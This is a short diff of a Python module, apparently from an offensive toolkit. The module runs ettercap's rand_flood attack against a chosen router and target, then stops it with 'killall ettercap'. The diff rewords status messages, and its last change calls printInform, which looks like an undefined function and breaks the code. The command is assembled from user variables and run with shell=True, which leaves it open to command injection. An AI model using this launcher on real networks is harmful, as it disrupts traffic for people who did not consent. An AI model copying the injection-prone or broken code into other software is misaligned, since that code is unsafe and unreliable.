@@ -53,10 +53,10 @@ help_notes = colors.red+"This module will not work without root permissions!"+co
 changelog = "Version 1.0:\nrelease"
 
 def run():
-	printInfo("Attack has been started...")
+	printInfo("Starting attack...")
 	command = 'xterm -e ettercap -i '+ variables['interface'][0] + ' -Tq -P rand_flood ' + '/'+variables['router'][0]+'//' + ' ' + '/'+variables['target'][0]+'//'
 	subprocess.Popen(command, stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
 	line_4 = colors.blue+"To stop attack press [enter]"+colors.end
 	fin = input(line_4)
 	os.system('killall ettercap')
-	printInfo("Attack stopped.")
+	printInform("Attack stopped.")
